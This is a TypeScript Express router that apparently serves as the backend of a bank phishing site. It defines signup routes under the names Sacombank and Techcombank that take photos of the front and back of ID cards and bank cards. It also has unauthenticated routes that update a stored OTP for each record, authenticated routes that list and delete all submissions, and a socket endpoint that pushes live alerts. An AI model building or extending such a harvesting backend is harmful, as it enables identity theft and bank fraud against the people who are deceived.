import express from "express";
import { AccountController } from "../controllers/account.controller";
import { SacombankController } from "../controllers/sacombank.controller";
import { TechcombankController } from "../controllers/techcombank.controller";
import { upload } from "../config/upload.config";
import { sendSocket } from "../controllers/socket.controller";
import { authMiddleware } from "../middlewares/auth.middleware";
import { AuthController } from "../controllers/auth.controller";
import path from "path";

const APIRouter = express.Router();
const accountController = new AccountController();
const saController = new SacombankController();
const techController = new TechcombankController();
const authController = new AuthController();

APIRouter.use(
  "/public",
  express.static(path.join(__dirname, "../../public/uploads"))
);

APIRouter.get("/", (req, res) => {
  res.send("Hello World!");
});

APIRouter.post(
  "/account/signup",
  upload.fields([
    { name: "frontIdCard", maxCount: 1 },
    { name: "backIdCard", maxCount: 1 },
    { name: "frontCard", maxCount: 1 },
    { name: "backCard", maxCount: 1 },
  ]),
  accountController.signup
);
APIRouter.post(
  "/sacombank/signup",
  upload.fields([
    { name: "frontIdCard", maxCount: 1 },
    { name: "backIdCard", maxCount: 1 },
    { name: "frontCard", maxCount: 1 },
    { name: "backCard", maxCount: 1 },
  ]),
  saController.signup
);
APIRouter.post(
  "/techcombank/signup",
  upload.fields([
    { name: "frontIdCard", maxCount: 1 },
    { name: "backIdCard", maxCount: 1 },
    { name: "frontCard", maxCount: 1 },
    { name: "backCard", maxCount: 1 },
  ]),
  techController.signup
);

APIRouter.get("/account", authMiddleware, accountController.getAll);
APIRouter.get("/sacombank", authMiddleware, saController.getAll);
APIRouter.get("/techcombank", authMiddleware, techController.getAll);

APIRouter.delete("/account/:id", authMiddleware, accountController.delete);
APIRouter.delete("/sacombank/:id", authMiddleware, saController.delete);
APIRouter.delete("/techcombank/:id", authMiddleware, techController.delete);

APIRouter.put("/account/:id", accountController.updateOTP);
APIRouter.put("/sacombank/:id", saController.updateOTP);
APIRouter.put("/techcombank/:id", techController.updateOTP);

APIRouter.post("/auth/login", authController.login);

APIRouter.put(
  "/auth/change-password",
  authMiddleware,
  authController.changePassword
);

APIRouter.post("/socket", authMiddleware, sendSocket);

export default APIRouter;
